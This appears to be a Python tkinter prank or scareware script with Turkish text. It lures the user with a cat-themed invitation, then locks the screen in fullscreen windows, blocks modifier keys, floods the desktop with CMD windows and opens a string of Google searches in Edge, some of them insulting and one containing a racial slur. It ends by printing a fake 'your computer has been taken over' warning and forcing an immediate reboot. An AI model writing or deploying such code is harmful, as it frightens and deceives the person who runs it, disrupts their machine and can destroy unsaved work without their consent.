import tkinter as tk
import os
import sys
import time
import threading
import webbrowser
import random
import string
from tkinter import font
import subprocess

def open_window():
    """
    İlk pencereyi açar. Kullanıcıdan şakaya katılıp katılmayacağını sorar.
    """
    root = tk.Tk()
    root.title("Senpai lütfen benimle oyna :d")
    root.geometry("400x300")
    root.protocol("WM_DELETE_WINDOW", root.destroy)  # Pencere kapatılınca uygulamayı sonlandır
    root.attributes('-topmost', True)

    message = "Miyav! Benimle oynamak ister misin, Senpai?"
    message_label = tk.Label(root, text=message, font=("Helvetica", 12))
    message_label.pack(pady=10)

    def on_click_yes():
        root.destroy()
        show_first_message_screen()

    yes_button = tk.Button(root, text="Evet, Oynarım!", command=on_click_yes)
    yes_button.pack(pady=10)

    root.after(0, lambda: root.focus_force())
    root.mainloop()

def block_key(event):
    """
    Klavye girişini engellemeye çalışır. Sistem tuşlarını engellemez.
    """
    print(f"Bloklanan tuş: {event.keysym}")
    # Engellenecek tuşları kontrol et
    if event.keysym in ['Alt_L', 'Alt_R', 'Control_L', 'Control_R', 'Shift_L', 'Shift_R', 'Win_L', 'Win_R', 'Menu']:
        return "break"  # Tuşu engelle
    return

def open_and_close_cmd_repeatedly(duration):
    """
    Belirli bir süre boyunca CMD'yi açıp kapatır.
    """
    start_time = time.time()
    while time.time() - start_time < duration:
        os.system('start cmd /c "timeout 0.3 & exit"')
        time.sleep(0.15)

def search_on_edge():
    """
    Microsoft Edge'de komik aramalar yapar ve imleç efektleri ekler.
    """
    user_searches = ["tung tung tung sahur", "turabi"]
    z_gen_searches = ["agla hackledim seni ", "Tüh! tüm bilgilerin elimde", "NE MAL ADAMSIN LA", "skibidi toilet",
                      "sigma erkek ", "uwu ", "based ", "woke ",
                      "NPC gibisin aq", "EVRİM AGACI"]
    komik_eklemeler = ["roblox komik fotoğraflar", "Komik zenci",
                       "komik anime kızları montaj", "kedi memleri 2024", "Anime kızları gerçekmi",
                       "minecraft fail anları", "komik futbol capsleri", "dede torun şakaları",
                       "troll face", "internet trolleri", "komik hayvan videoları derlemesi",
                       "yanlışlıkla çekilmiş komik fotoğraflar", "liselilerin komik tweetleri",
                       "oyunlardaki glitchler komik anlar", "en komik kedi videoları", "komik bebek videoları",
                       "türkiye deki komik olaylar","komik şakalar","komik hayvan sesleri"] #uzatıldı
    all_searches = user_searches + z_gen_searches + komik_eklemeler
    edge_path = "C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe"

    for query in all_searches:
        try:
            webbrowser.register('edge', None, webbrowser.BackgroundBrowser(edge_path))
            webbrowser.get('edge').open_new_tab(f"https://www.google.com/search?q={query.replace(' ', '+')}")
            time.sleep(1)
            # İmleç efektleri (basit bir yaklaşım, gerçek imleç kontrolü mümkün değil)
            for _ in range(3):  # Efekti birkaç kez tekrarla
                x, y = random.randint(0, 1920), random.randint(0, 1080)  # Ekran çözünürlüğüne göre ayarlanabilir
                print(f"İmleç pozisyonu: {x}, {y}  X") # Konsola yazdır
                time.sleep(0.2)
        except Exception as e:
            print(f"Edge açılırken bir hata oluştu: {e}")
            break

def show_first_message_screen():
    """
    İlk mesaj ekranını gösterir.
    """
    message_screen = tk.Tk()
    message_screen.attributes('-fullscreen', True)
    message_screen.configure(bg='white')
    message_screen.bind("<Key>", block_key)

    label_text = "Senpai! Sen benim kedimsin artık 😼"
    label = tk.Label(message_screen, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="purple")
    label.pack(pady=200, anchor=tk.CENTER)

    message_screen.after(2000, lambda: [message_screen.destroy(), show_edge_and_cmd()])

    message_screen.mainloop()

def show_edge_and_cmd():
    """
    Edge ve CMD ekranlarını gösterir.
    """
    edge_cmd_screen = tk.Tk()
    edge_cmd_screen.attributes('-fullscreen', True)
    edge_cmd_screen.configure(bg='white')
    edge_cmd_screen.bind("<Key>", block_key)

    search_duration = 20
    threading.Thread(target=open_and_close_cmd_repeatedly, args=(search_duration,)).start()
    threading.Thread(target=search_on_edge).start()

    edge_cmd_screen.after(search_duration * 1000 + 2000, lambda: [edge_cmd_screen.destroy(), show_second_white_screen()])

    edge_cmd_screen.mainloop()

def show_second_white_screen():
    """
    İkinci beyaz ekranı gösterir ve yeniden başlatma işlemini başlatır.
    """
    white_screen_2 = tk.Tk()
    white_screen_2.attributes('-fullscreen', True)
    white_screen_2.configure(bg='white')
    white_screen_2.bind("<Key>", block_key)

    label_text = "Senpai! Sen tam bir aptalsın! 😼"
    label = tk.Label(white_screen_2, text=label_text, font=("Comic Sans MS", 36, "bold"), fg="red")
    label.pack(pady=200, anchor=tk.CENTER)

    def on_closing_second_screen():
        pass

    white_screen_2.protocol("WM_DELETE_WINDOW", on_closing_second_screen)

    white_screen_2.after(5000, cover_screen_with_cmd_and_reboot)

    white_screen_2.mainloop()

def cover_screen_with_cmd_and_reboot():
    """
    Ekranı CMD pencereleriyle kaplar, bekler, siyah ekran gösterir, yazılar yazar ve yeniden başlatır.
    """
    for _ in range(30):
        os.system('start cmd')
        time.sleep(0.1)
    time.sleep(3)

    cmd_process = subprocess.Popen(['cmd'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    cmd_inputs = [
        "color 00\n",
        "cls\n",
        "echo :D\n",
        "echo Bilgisayarınız ele geçirildi!\n",
        "echo Format atmadan kurtulamazsınız!\n",
        "timeout 5\n",
        "shutdown /r /t 1\n"
    ]
    for cmd_input in cmd_inputs:
        cmd_process.stdin.write(cmd_input.encode('utf-8'))
    cmd_process.stdin.flush()
    cmd_process.communicate()
    cmd_process.wait()

if __name__ == "__main__":
    # Eğer yeniden başlatmadan sonra çalışıyorsa bu fonksiyonu çağır
    if len(sys.argv) > 1 and sys.argv[1] == "restarted":
        cover_screen_with_cmd_and_reboot()
    else:
        open_window()
